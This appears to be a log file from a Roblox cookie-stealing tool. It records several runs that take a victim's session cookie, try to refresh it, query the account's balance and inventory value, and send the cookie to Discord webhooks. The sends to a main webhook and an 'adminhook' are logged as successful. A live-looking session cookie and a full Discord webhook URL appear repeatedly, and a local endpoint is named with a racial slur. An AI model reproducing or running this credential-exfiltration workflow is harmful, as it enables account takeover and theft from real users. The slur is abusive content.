+[2025-11-12 08:49:14] ❌ [ERROR] LOCAL_REQUEST | URL: http://localhost:8000/controlPage/apis/nigger.php?cookie=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhACIhwKBGR1aWQSFDEwMTQwMjY2NzgyNzQ0MTQ4MTE4KAE.fR2NsajB_Bn-WC-k6NW25y-bmZX77TxQDr_1_JVSqX6D8QeAsM8Zic2jBL9sBZ-iIxAi6eyr_OnppQtlpqb8QMj0knkQrYvyaTRoIaMTRRsWW5f-6UQrVFJIvJMvS423-MqHhqMNl_isYRcFgeUZduFQBR1fRIQtOJQFEGluXG_INdioOpTjZvkxBJYxl8Q1oMT5pAjr8NCjzyc_jAZK-fnGVOuZgszJs7yHiHGCUNtrRVKE3uOb_-aqnEz81u01iJ4S6OdpTUhoY_4efTq_XDQUwkwh61GEE6ZByB8nPCnFUBWtHh-Xk79nb2MkT3T1PfpoGsP5Nqvy89i3jY0WkEaPRWJ6NRfG_u6o41aPMRgNk6VP1_NAAevo4GhnyFyUqURYDr0nRNKrc5sQkF5qXStOx8fGxh8CkDx5pvkhWWW6fY4PG6ipN-TFvSpbpHLQ647n_pxIdgCk9pW_EndAY37xT_lF64pfsdb1Sav0Ai45ScPt47W4BVsoVYfAf0tyl9xshnVqI04cwRSU-gTAYdwERum9ez2fpGf3Tik3_GmKzxPFViBpzB3q5DLut4WN2m9BpPh3spkAtxWpUKh843AGCJt-nUVbR7AF_w9_FFut3I-lHi8eDE7elY2wbcafczGd5hnle7oJLjKQGUXdqjJLgI91PIg58bt3ybWfjKW1x5sIv_Ofufo1mrsQKY3Y0ogz8fXZ49b1Uh8j4z09oyR2z-XwXCqtNZ_tblaBBWEp5yj9eCcSDnd9nDhHZN0WUbBsyo8-qagxSEluA2wa8BhGyhjAhvW9MqRS9G6Rv6cizqVGRrhamr5uFz3js4GyyXm4hM8sZQPmyl3krJfgF4vNhnXXbX-wbgjPanFVTg4Rd3IRGX648Jl7UEy_N5I8MbK70xqNkarx85gdG73dqqzw4cbkkkBIrO_kNACBWseXLqjVZoFM70sp_UCbpcpVbM2rwLh4AxwKRGpYKTaxDXF9POSuYkcuz5FUL1cGvr5xVplA_4rsVVuxBasc97adYYhc7-Z-5EdNGrlF3a_qfpqM6HtX0QdGlyGOqbC0okveJtR4TGMT7FvyD6OB0NCJGQ_TkuyK4mAdUUv5Sw7o71zFpzMUUdaj3XasIA_tklB0rg1myrRiBPGAvH41reB7sp4e8-J9DkMMiFYHxCLoFgQR2f0' \   -H 'priority: u=0, i' \   -H 'referer: https://www.roblox.com/Login' \   -H 'sec-ch-ua: "Not)A | HTTP 0: No Response - Connection failed or timeout | CURL Error: URL rejected: Malformed input to a URL function
+[2025-11-12 08:49:14] ⚠️ [WARNING] COOKIE_REFRESH | Refresh failed: No response from refresh endpoint - Using original cookie
+[2025-11-12 08:49:14] ⚠️ [INFO] FETCH_USER_SETTINGS | Fetching user settings from Roblox
+[2025-11-12 08:49:15] ❌ [ERROR] FETCH_USER_SETTINGS | URL: https://www.roblox.com/my/settings/json | HTTP 302: Unknown HTTP Code: 302 | No response body
+[2025-11-12 08:49:15] ❌ [ERROR] FETCH_USER_SETTINGS | Failed to extract UserId: Empty or invalid JSON response from Roblox API
+[2025-11-12 08:49:15] ⚠️ [INFO] FETCH_USER_INFO | Fetching user info for userId: 0
+[2025-11-12 08:49:15] ❌ [ERROR] FETCH_USER_INFO | URL: https://users.roblox.com/v1/users/0 | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"errors":[{"code":3,"message":"The user id is invalid."}]}
+[2025-11-12 08:49:15] ⚠️ [INFO] FETCH_USER_INFO | Username: Unknown, DisplayName: Unknown
+[2025-11-12 08:49:20] ⚠️ [INFO] FETCH_BALANCE | Fetching Robux balance
+[2025-11-12 08:49:21] ❌ [ERROR] FETCH_BALANCE | URL: https://economy.roblox.com/v1/users/0/currency | HTTP 401: Unauthorized - Invalid webhook token | Response snippet: {"errors":[{"code":9002,"subcode":0,"message":"Authentication token is missing"}]}
+[2025-11-12 08:49:21] ⚠️ [INFO] FETCH_BALANCE | Robux: 0, Pending: ❓ Unknown
+[2025-11-12 08:49:21] ⚠️ [INFO] FETCH_INVENTORY | Fetching inventory and RAP data
+[2025-11-12 08:49:21] ❌ [ERROR] FETCH_INVENTORY | URL: https://inventory.roblox.com/v1/users/0/assets/collectibles?limit=100 | HTTP 400: Bad Request - Invalid webhook URL or malformed request | Response snippet: {"errors":[{"code":1,"message":"The specified user does not exist!","field":"userId"}]}
+[2025-11-12 08:49:21] ⚠️ [INFO] FETCH_INVENTORY | RAP: 0, Inventory Count: ❓ Unknown
+[2025-11-12 08:49:25] ⚠️ [INFO] WEBHOOK_COLLECTION | Starting webhook collection
+[2025-11-12 08:49:25] ✅ [SUCCESS] WEBHOOK_COLLECTION | Main webhook added to array
+[2025-11-12 08:49:25] ⚠️ [INFO] WEBHOOK_COLLECTION | Dualhook not provided (optional)
+[2025-11-12 08:49:25] ✅ [SUCCESS] WEBHOOK_COLLECTION | Total webhooks collected: 1
+[2025-11-12 08:49:25] ⚠️ [INFO] HIGH_VALUE_CHECK | isHighValue = true
+[2025-11-12 08:49:25] ⚠️ [INFO] WEBHOOK_COLLECTION | High value detected, adding filtered webhook
+[2025-11-12 08:49:25] ⚠️ [INFO] WEBHOOK_COLLECTION | Main webhook retained in send list
+[2025-11-12 08:49:25] ⚠️ [INFO] WEBHOOK_COLLECTION | Adminhook included in send list
+[2025-11-12 08:49:25] ⚠️ [INFO] WEBHOOK_COLLECTION | Final webhook count: 3
+[2025-11-12 08:49:25] ⚠️ [INFO] WEBHOOK_SENDING | Starting to send embeds to 3 webhook(s)
+[2025-11-12 08:49:25] ⚠️ [INFO] WEBHOOK_SENDING | Processing webhook_0 (index: 0)
+[2025-11-12 08:49:25] ⚠️ [INFO] WEBHOOK_SENDING | Sending embed1 (RAP) to webhook_0
+[2025-11-12 08:49:25] ❌ [ERROR] WEBHOOK_SENDING | Embed1 failed for webhook_0 - URL: https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"message": "Unknown Webhook", "code": 10015}
+[2025-11-12 08:49:26] ⚠️ [INFO] WEBHOOK_SENDING | Sending embed2 (cookie) to webhook_0
+[2025-11-12 08:49:26] ⚠️ [WARNING] WEBHOOK_SENDING | Embed2 failed for webhook_0 - URL: https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"message": "Unknown Webhook", "code": 10015} - Retrying...
+[2025-11-12 08:49:27] ⚠️ [WARNING] WEBHOOK_SENDING | Embed2 retry failed for webhook_0 - URL: https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"message": "Unknown Webhook", "code": 10015} - Final retry...
+[2025-11-12 08:49:28] ❌ [ERROR] WEBHOOK_SENDING | Embed2 final retry failed for webhook_0 - URL: https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"message": "Unknown Webhook", "code": 10015}
+[2025-11-12 08:49:29] ⚠️ [INFO] WEBHOOK_SENDING | Processing main_webhook (index: 1)
+[2025-11-12 08:49:29] ⚠️ [INFO] WEBHOOK_SENDING | Sending embed1 (RAP) to main_webhook
+[2025-11-12 08:49:29] ✅ [SUCCESS] WEBHOOK_SENDING | Embed1 sent to main_webhook - HTTP 204
+[2025-11-12 08:49:29] ⚠️ [INFO] WEBHOOK_SENDING | Sending embed2 (cookie) to main_webhook
+[2025-11-12 08:49:30] ✅ [SUCCESS] WEBHOOK_SENDING | Embed2 sent to main_webhook - HTTP 204
+[2025-11-12 08:49:30] ⚠️ [INFO] WEBHOOK_SENDING | Processing adminhook (index: 2)
+[2025-11-12 08:49:30] ⚠️ [INFO] WEBHOOK_SENDING | Sending embed1 (RAP) to adminhook
+[2025-11-12 08:49:31] ✅ [SUCCESS] WEBHOOK_SENDING | Embed1 sent to adminhook - HTTP 204
+[2025-11-12 08:49:31] ⚠️ [INFO] WEBHOOK_SENDING | Sending embed2 (cookie) to adminhook
+[2025-11-12 08:49:32] ✅ [SUCCESS] WEBHOOK_SENDING | Embed2 sent to adminhook - HTTP 204
+[2025-11-12 08:49:32] ✅ [SUCCESS] WEBHOOK_SENDING | Finished sending to all webhooks in array
+[2025-11-12 08:49:32] ⚠️ [INFO] WEBHOOK_SENDING | Sending to non-filtered webhook (backup)
+[2025-11-12 08:49:32] ❌ [ERROR] WEBHOOK_SENDING | Non-filtered webhook embed1 failed - URL: https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"message": "Unknown Webhook", "code": 10015}
+[2025-11-12 08:49:33] ❌ [ERROR] WEBHOOK_SENDING | Non-filtered webhook embed2 failed - URL: https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"message": "Unknown Webhook", "code": 10015}
+[2025-11-12 08:49:33] ✅ [SUCCESS] SCRIPT_END | Script completed successfully
+[2025-11-12 08:53:42] ⚠️ [INFO] SCRIPT_START | UserInfo script started
+[2025-11-12 08:53:42] ✅ [SUCCESS] COOKIE_RECEIVED | Cookie received from request
+[2025-11-12 08:53:42] ⚠️ [INFO] COOKIE_REFRESH | Attempting to refresh cookie
+[2025-11-12 08:53:48] ❌ [ERROR] LOCAL_REQUEST | URL: http://localhost:8000/controlPage/apis/refresher.php?cookie=_%7CWARNING%3A-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.%7C_CAEaAhACIhwKBGR1aWQSFDEwMTQwMjY2NzgyNzQ0MTQ4MTE4KAE.fR2NsajB_Bn-WC-k6NW25y-bmZX77TxQDr_1_JVSqX6D8QeAsM8Zic2jBL9sBZ-iIxAi6eyr_OnppQtlpqb8QMj0knkQrYvyaTRoIaMTRRsWW5f-6UQrVFJIvJMvS423-MqHhqMNl_isYRcFgeUZduFQBR1fRIQtOJQFEGluXG_INdioOpTjZvkxBJYxl8Q1oMT5pAjr8NCjzyc_jAZK-fnGVOuZgszJs7yHiHGCUNtrRVKE3uOb_-aqnEz81u01iJ4S6OdpTUhoY_4efTq_XDQUwkwh61GEE6ZByB8nPCnFUBWtHh-Xk79nb2MkT3T1PfpoGsP5Nqvy89i3jY0WkEaPRWJ6NRfG_u6o41aPMRgNk6VP1_NAAevo4GhnyFyUqURYDr0nRNKrc5sQkF5qXStOx8fGxh8CkDx5pvkhWWW6fY4PG6ipN-TFvSpbpHLQ647n_pxIdgCk9pW_EndAY37xT_lF64pfsdb1Sav0Ai45ScPt47W4BVsoVYfAf0tyl9xshnVqI04cwRSU-gTAYdwERum9ez2fpGf3Tik3_GmKzxPFViBpzB3q5DLut4WN2m9BpPh3spkAtxWpUKh843AGCJt-nUVbR7AF_w9_FFut3I-lHi8eDE7elY2wbcafczGd5hnle7oJLjKQGUXdqjJLgI91PIg58bt3ybWfjKW1x5sIv_Ofufo1mrsQKY3Y0ogz8fXZ49b1Uh8j4z09oyR2z-XwXCqtNZ_tblaBBWEp5yj9eCcSDnd9nDhHZN0WUbBsyo8-qagxSEluA2wa8BhGyhjAhvW9MqRS9G6Rv6cizqVGRrhamr5uFz3js4GyyXm4hM8sZQPmyl3krJfgF4vNhnXXbX-wbgjPanFVTg4Rd3IRGX648Jl7UEy_N5I8MbK70xqNkarx85gdG73dqqzw4cbkkkBIrO_kNACBWseXLqjVZoFM70sp_UCbpcpVbM2rwLh4AxwKRGpYKTaxDXF9POSuYkcuz5FUL1cGvr5xVplA_4rsVVuxBasc97adYYhc7-Z-5EdNGrlF3a_qfpqM6HtX0QdGlyGOqbC0okveJtR4TGMT7FvyD6OB0NCJGQ_TkuyK4mAdUUv5Sw7o71zFpzMUUdaj3XasIA_tklB0rg1myrRiBPGAvH41reB7sp4e8-J9DkMMiFYHxCLoFgQR2f0%27%20%5C%20%20%20-H%20%27priority%3A%20u%3D0%2C%20i%27%20%5C%20%20%20-H%20%27referer%3A%20https%3A%2F%2Fwww.roblox.com%2FLogin%27%20%5C%20%20%20-H%20%27sec-ch-ua%3A%20%22Not%29A | HTTP 0: No Response - Connection failed or timeout | CURL Error: Operation timed out after 6004 milliseconds with 0 bytes received
+[2025-11-12 08:53:48] ⚠️ [WARNING] COOKIE_REFRESH | Refresher failed: Request failed or timeout - Trying alternative method
+[2025-11-12 08:53:54] ❌ [ERROR] LOCAL_REQUEST | URL: http://localhost:8000/controlPage/apis/nigger.php?cookie=_%7CWARNING%3A-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.%7C_CAEaAhACIhwKBGR1aWQSFDEwMTQwMjY2NzgyNzQ0MTQ4MTE4KAE.fR2NsajB_Bn-WC-k6NW25y-bmZX77TxQDr_1_JVSqX6D8QeAsM8Zic2jBL9sBZ-iIxAi6eyr_OnppQtlpqb8QMj0knkQrYvyaTRoIaMTRRsWW5f-6UQrVFJIvJMvS423-MqHhqMNl_isYRcFgeUZduFQBR1fRIQtOJQFEGluXG_INdioOpTjZvkxBJYxl8Q1oMT5pAjr8NCjzyc_jAZK-fnGVOuZgszJs7yHiHGCUNtrRVKE3uOb_-aqnEz81u01iJ4S6OdpTUhoY_4efTq_XDQUwkwh61GEE6ZByB8nPCnFUBWtHh-Xk79nb2MkT3T1PfpoGsP5Nqvy89i3jY0WkEaPRWJ6NRfG_u6o41aPMRgNk6VP1_NAAevo4GhnyFyUqURYDr0nRNKrc5sQkF5qXStOx8fGxh8CkDx5pvkhWWW6fY4PG6ipN-TFvSpbpHLQ647n_pxIdgCk9pW_EndAY37xT_lF64pfsdb1Sav0Ai45ScPt47W4BVsoVYfAf0tyl9xshnVqI04cwRSU-gTAYdwERum9ez2fpGf3Tik3_GmKzxPFViBpzB3q5DLut4WN2m9BpPh3spkAtxWpUKh843AGCJt-nUVbR7AF_w9_FFut3I-lHi8eDE7elY2wbcafczGd5hnle7oJLjKQGUXdqjJLgI91PIg58bt3ybWfjKW1x5sIv_Ofufo1mrsQKY3Y0ogz8fXZ49b1Uh8j4z09oyR2z-XwXCqtNZ_tblaBBWEp5yj9eCcSDnd9nDhHZN0WUbBsyo8-qagxSEluA2wa8BhGyhjAhvW9MqRS9G6Rv6cizqVGRrhamr5uFz3js4GyyXm4hM8sZQPmyl3krJfgF4vNhnXXbX-wbgjPanFVTg4Rd3IRGX648Jl7UEy_N5I8MbK70xqNkarx85gdG73dqqzw4cbkkkBIrO_kNACBWseXLqjVZoFM70sp_UCbpcpVbM2rwLh4AxwKRGpYKTaxDXF9POSuYkcuz5FUL1cGvr5xVplA_4rsVVuxBasc97adYYhc7-Z-5EdNGrlF3a_qfpqM6HtX0QdGlyGOqbC0okveJtR4TGMT7FvyD6OB0NCJGQ_TkuyK4mAdUUv5Sw7o71zFpzMUUdaj3XasIA_tklB0rg1myrRiBPGAvH41reB7sp4e8-J9DkMMiFYHxCLoFgQR2f0%27%20%5C%20%20%20-H%20%27priority%3A%20u%3D0%2C%20i%27%20%5C%20%20%20-H%20%27referer%3A%20https%3A%2F%2Fwww.roblox.com%2FLogin%27%20%5C%20%20%20-H%20%27sec-ch-ua%3A%20%22Not%29A | HTTP 0: No Response - Connection failed or timeout | CURL Error: Operation timed out after 6003 milliseconds with 0 bytes received
+[2025-11-12 08:53:54] ⚠️ [WARNING] COOKIE_REFRESH | Refresh failed: No response from refresh endpoint - Using original cookie
+[2025-11-12 08:53:54] ⚠️ [INFO] FETCH_USER_SETTINGS | Fetching user settings from Roblox
+[2025-11-12 08:53:55] ✅ [SUCCESS] FETCH_USER_SETTINGS | HTTP 200
+[2025-11-12 08:53:55] ❌ [ERROR] FETCH_USER_SETTINGS | JSON decode failed: Syntax error
+[2025-11-12 08:53:55] ❌ [ERROR] FETCH_USER_SETTINGS | Failed to extract UserId: Empty or invalid JSON response from Roblox API
+[2025-11-12 08:53:55] ⚠️ [INFO] FETCH_USER_INFO | Fetching user info for userId: 0
+[2025-11-12 08:53:56] ❌ [ERROR] FETCH_USER_INFO | URL: https://users.roblox.com/v1/users/0 | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"errors":[{"code":3,"message":"The user id is invalid."}]}
+[2025-11-12 08:53:56] ⚠️ [INFO] FETCH_USER_INFO | Username: Unknown, DisplayName: Unknown
+[2025-11-12 08:54:01] ⚠️ [INFO] FETCH_BALANCE | Fetching Robux balance
+[2025-11-12 08:54:02] ❌ [ERROR] FETCH_BALANCE | URL: https://economy.roblox.com/v1/users/0/currency | HTTP 401: Unauthorized - Invalid webhook token | Response snippet: {"errors":[{"code":9002,"subcode":0,"message":"Authentication token is missing"}]}
+[2025-11-12 08:54:02] ⚠️ [INFO] FETCH_BALANCE | Robux: 0, Pending: ❓ Unknown
+[2025-11-12 08:54:02] ⚠️ [INFO] FETCH_INVENTORY | Fetching inventory and RAP data
+[2025-11-12 08:54:02] ❌ [ERROR] FETCH_INVENTORY | URL: https://inventory.roblox.com/v1/users/0/assets/collectibles?limit=100 | HTTP 400: Bad Request - Invalid webhook URL or malformed request | Response snippet: {"errors":[{"code":1,"message":"The specified user does not exist!","field":"userId"}]}
+[2025-11-12 08:54:02] ⚠️ [INFO] FETCH_INVENTORY | RAP: 0, Inventory Count: ❓ Unknown
+[2025-11-12 08:54:07] ⚠️ [INFO] WEBHOOK_COLLECTION | Starting webhook collection
+[2025-11-12 08:54:07] ✅ [SUCCESS] WEBHOOK_COLLECTION | Main webhook added to array
+[2025-11-12 08:54:07] ⚠️ [INFO] WEBHOOK_COLLECTION | Dualhook not provided (optional)
+[2025-11-12 08:54:07] ✅ [SUCCESS] WEBHOOK_COLLECTION | Total webhooks collected: 1
+[2025-11-12 08:54:07] ⚠️ [INFO] HIGH_VALUE_CHECK | isHighValue = true
+[2025-11-12 08:54:07] ⚠️ [INFO] WEBHOOK_COLLECTION | High value detected, adding filtered webhook
+[2025-11-12 08:54:07] ⚠️ [INFO] WEBHOOK_COLLECTION | Main webhook retained in send list
+[2025-11-12 08:54:07] ⚠️ [INFO] WEBHOOK_COLLECTION | Adminhook included in send list
+[2025-11-12 08:54:07] ⚠️ [INFO] WEBHOOK_COLLECTION | Final webhook count: 3
+[2025-11-12 08:54:07] ⚠️ [INFO] WEBHOOK_SENDING | Starting to send embeds to 3 webhook(s)
+[2025-11-12 08:54:07] ⚠️ [INFO] WEBHOOK_SENDING | Processing webhook_0 (index: 0)
+[2025-11-12 08:54:07] ⚠️ [INFO] WEBHOOK_SENDING | Sending embed1 (RAP) to webhook_0
+[2025-11-12 08:54:07] ❌ [ERROR] WEBHOOK_SENDING | Embed1 failed for webhook_0 - URL: https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"message": "Unknown Webhook", "code": 10015}
+[2025-11-12 08:54:08] ⚠️ [INFO] WEBHOOK_SENDING | Sending embed2 (cookie) to webhook_0
+[2025-11-12 08:54:08] ⚠️ [WARNING] WEBHOOK_SENDING | Embed2 failed for webhook_0 - URL: https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"message": "Unknown Webhook", "code": 10015} - Retrying...
+[2025-11-12 08:54:09] ⚠️ [WARNING] WEBHOOK_SENDING | Embed2 retry failed for webhook_0 - URL: https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"message": "Unknown Webhook", "code": 10015} - Final retry...
+[2025-11-12 08:54:10] ❌ [ERROR] WEBHOOK_SENDING | Embed2 final retry failed for webhook_0 - URL: https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"message": "Unknown Webhook", "code": 10015}
+[2025-11-12 08:54:10] ⚠️ [INFO] WEBHOOK_SENDING | Processing main_webhook (index: 1)
+[2025-11-12 08:54:10] ⚠️ [INFO] WEBHOOK_SENDING | Sending embed1 (RAP) to main_webhook
+[2025-11-12 08:54:11] ✅ [SUCCESS] WEBHOOK_SENDING | Embed1 sent to main_webhook - HTTP 204
+[2025-11-12 08:54:11] ⚠️ [INFO] WEBHOOK_SENDING | Sending embed2 (cookie) to main_webhook
+[2025-11-12 08:54:12] ✅ [SUCCESS] WEBHOOK_SENDING | Embed2 sent to main_webhook - HTTP 204
+[2025-11-12 08:54:12] ⚠️ [INFO] WEBHOOK_SENDING | Processing adminhook (index: 2)
+[2025-11-12 08:54:12] ⚠️ [INFO] WEBHOOK_SENDING | Sending embed1 (RAP) to adminhook
+[2025-11-12 08:54:13] ✅ [SUCCESS] WEBHOOK_SENDING | Embed1 sent to adminhook - HTTP 204
+[2025-11-12 08:54:13] ⚠️ [INFO] WEBHOOK_SENDING | Sending embed2 (cookie) to adminhook
+[2025-11-12 08:54:14] ✅ [SUCCESS] WEBHOOK_SENDING | Embed2 sent to adminhook - HTTP 204
+[2025-11-12 08:54:14] ✅ [SUCCESS] WEBHOOK_SENDING | Finished sending to all webhooks in array
+[2025-11-12 08:54:14] ⚠️ [INFO] WEBHOOK_SENDING | Sending to non-filtered webhook (backup)
+[2025-11-12 08:54:14] ❌ [ERROR] WEBHOOK_SENDING | Non-filtered webhook embed1 failed - URL: https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"message": "Unknown Webhook", "code": 10015}
+[2025-11-12 08:54:15] ❌ [ERROR] WEBHOOK_SENDING | Non-filtered webhook embed2 failed - URL: https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"message": "Unknown Webhook", "code": 10015}
+[2025-11-12 08:54:15] ✅ [SUCCESS] SCRIPT_END | Script completed successfully
+[2025-11-12 09:08:54] ⚠️ [INFO] SCRIPT_START | UserInfo script started
+[2025-11-12 09:08:54] ✅ [SUCCESS] COOKIE_RECEIVED | Cookie received and normalized
+[2025-11-12 09:08:54] ⚠️ [INFO] COOKIE_REFRESH | Attempting to refresh cookie
+[2025-11-12 09:09:00] ❌ [ERROR] LOCAL_REQUEST | URL: http://localhost:8000/controlPage/apis/refresher.php?cookie=_%7CWARNING%3A-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.%7C_CAEaAhACIhwKBGR1aWQSFDEwMTQwMjY2NzgyNzQ0MTQ4MTE4KAE.fR2NsajB_Bn-WC-k6NW25y-bmZX77TxQDr_1_JVSqX6D8QeAsM8Zic2jBL9sBZ-iIxAi6eyr_OnppQtlpqb8QMj0knkQrYvyaTRoIaMTRRsWW5f-6UQrVFJIvJMvS423-MqHhqMNl_isYRcFgeUZduFQBR1fRIQtOJQFEGluXG_INdioOpTjZvkxBJYxl8Q1oMT5pAjr8NCjzyc_jAZK-fnGVOuZgszJs7yHiHGCUNtrRVKE3uOb_-aqnEz81u01iJ4S6OdpTUhoY_4efTq_XDQUwkwh61GEE6ZByB8nPCnFUBWtHh-Xk79nb2MkT3T1PfpoGsP5Nqvy89i3jY0WkEaPRWJ6NRfG_u6o41aPMRgNk6VP1_NAAevo4GhnyFyUqURYDr0nRNKrc5sQkF5qXStOx8fGxh8CkDx5pvkhWWW6fY4PG6ipN-TFvSpbpHLQ647n_pxIdgCk9pW_EndAY37xT_lF64pfsdb1Sav0Ai45ScPt47W4BVsoVYfAf0tyl9xshnVqI04cwRSU-gTAYdwERum9ez2fpGf3Tik3_GmKzxPFViBpzB3q5DLut4WN2m9BpPh3spkAtxWpUKh843AGCJt-nUVbR7AF_w9_FFut3I-lHi8eDE7elY2wbcafczGd5hnle7oJLjKQGUXdqjJLgI91PIg58bt3ybWfjKW1x5sIv_Ofufo1mrsQKY3Y0ogz8fXZ49b1Uh8j4z09oyR2z-XwXCqtNZ_tblaBBWEp5yj9eCcSDnd9nDhHZN0WUbBsyo8-qagxSEluA2wa8BhGyhjAhvW9MqRS9G6Rv6cizqVGRrhamr5uFz3js4GyyXm4hM8sZQPmyl3krJfgF4vNhnXXbX-wbgjPanFVTg4Rd3IRGX648Jl7UEy_N5I8MbK70xqNkarx85gdG73dqqzw4cbkkkBIrO_kNACBWseXLqjVZoFM70sp_UCbpcpVbM2rwLh4AxwKRGpYKTaxDXF9POSuYkcuz5FUL1cGvr5xVplA_4rsVVuxBasc97adYYhc7-Z-5EdNGrlF3a_qfpqM6HtX0QdGlyGOqbC0okveJtR4TGMT7FvyD6OB0NCJGQ_TkuyK4mAdUUv5Sw7o71zFpzMUUdaj3XasIA_tklB0rg1myrRiBPGAvH41reB7sp4e8-J9DkMMiFYHxCLoFgQR2f0 | HTTP 0: No Response - Connection failed or timeout | CURL Error: Operation timed out after 6014 milliseconds with 0 bytes received
+[2025-11-12 09:09:00] ⚠️ [WARNING] COOKIE_REFRESH | Refresher failed: Request failed or timeout - Trying alternative method
+[2025-11-12 09:09:06] ❌ [ERROR] LOCAL_REQUEST | URL: http://localhost:8000/controlPage/apis/nigger.php?cookie=_%7CWARNING%3A-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.%7C_CAEaAhACIhwKBGR1aWQSFDEwMTQwMjY2NzgyNzQ0MTQ4MTE4KAE.fR2NsajB_Bn-WC-k6NW25y-bmZX77TxQDr_1_JVSqX6D8QeAsM8Zic2jBL9sBZ-iIxAi6eyr_OnppQtlpqb8QMj0knkQrYvyaTRoIaMTRRsWW5f-6UQrVFJIvJMvS423-MqHhqMNl_isYRcFgeUZduFQBR1fRIQtOJQFEGluXG_INdioOpTjZvkxBJYxl8Q1oMT5pAjr8NCjzyc_jAZK-fnGVOuZgszJs7yHiHGCUNtrRVKE3uOb_-aqnEz81u01iJ4S6OdpTUhoY_4efTq_XDQUwkwh61GEE6ZByB8nPCnFUBWtHh-Xk79nb2MkT3T1PfpoGsP5Nqvy89i3jY0WkEaPRWJ6NRfG_u6o41aPMRgNk6VP1_NAAevo4GhnyFyUqURYDr0nRNKrc5sQkF5qXStOx8fGxh8CkDx5pvkhWWW6fY4PG6ipN-TFvSpbpHLQ647n_pxIdgCk9pW_EndAY37xT_lF64pfsdb1Sav0Ai45ScPt47W4BVsoVYfAf0tyl9xshnVqI04cwRSU-gTAYdwERum9ez2fpGf3Tik3_GmKzxPFViBpzB3q5DLut4WN2m9BpPh3spkAtxWpUKh843AGCJt-nUVbR7AF_w9_FFut3I-lHi8eDE7elY2wbcafczGd5hnle7oJLjKQGUXdqjJLgI91PIg58bt3ybWfjKW1x5sIv_Ofufo1mrsQKY3Y0ogz8fXZ49b1Uh8j4z09oyR2z-XwXCqtNZ_tblaBBWEp5yj9eCcSDnd9nDhHZN0WUbBsyo8-qagxSEluA2wa8BhGyhjAhvW9MqRS9G6Rv6cizqVGRrhamr5uFz3js4GyyXm4hM8sZQPmyl3krJfgF4vNhnXXbX-wbgjPanFVTg4Rd3IRGX648Jl7UEy_N5I8MbK70xqNkarx85gdG73dqqzw4cbkkkBIrO_kNACBWseXLqjVZoFM70sp_UCbpcpVbM2rwLh4AxwKRGpYKTaxDXF9POSuYkcuz5FUL1cGvr5xVplA_4rsVVuxBasc97adYYhc7-Z-5EdNGrlF3a_qfpqM6HtX0QdGlyGOqbC0okveJtR4TGMT7FvyD6OB0NCJGQ_TkuyK4mAdUUv5Sw7o71zFpzMUUdaj3XasIA_tklB0rg1myrRiBPGAvH41reB7sp4e8-J9DkMMiFYHxCLoFgQR2f0 | HTTP 0: No Response - Connection failed or timeout | CURL Error: Operation timed out after 6009 milliseconds with 0 bytes received
+[2025-11-12 09:09:06] ⚠️ [WARNING] COOKIE_REFRESH | Refresh failed: No response from refresh endpoint - Using original cookie
+[2025-11-12 09:09:06] ⚠️ [INFO] FETCH_USER_SETTINGS | Fetching user settings from Roblox
+[2025-11-12 09:09:08] ✅ [SUCCESS] FETCH_USER_SETTINGS | HTTP 200
